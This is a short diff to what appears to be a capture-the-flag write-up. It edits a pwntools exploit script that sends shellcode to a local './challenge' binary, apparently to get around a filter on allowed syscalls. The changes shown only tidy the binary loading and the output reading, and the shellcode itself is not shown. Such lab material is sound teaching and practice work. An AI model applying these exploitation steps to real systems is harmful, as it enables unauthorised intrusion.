@@ -100,10 +100,9 @@ The following script demonstrates the attack. We first generate a 32-bit payload
 ```python
 from pwn import *
 
-exe = "./challenge"
-context.binary = exe
+elf = context.binary = ELF("./challenge")
 
-p = process(exe)
+p = process(elf.path)
 
 # 1. Generate 32-bit payload
 # The challenge allows syscalls 3, 4, 5, 6 (64-bit numbers)
@@ -137,11 +136,8 @@ shellcode = (
 
 p.send(shellcode)
 
-# Use recvall with timeout because of the infinite loop
-try:
-    print(p.recvall(timeout=1).decode())
-except:
-    pass
+# Read output
+print(p.recvall(timeout=1).decode())
 
 p.close()
 ```
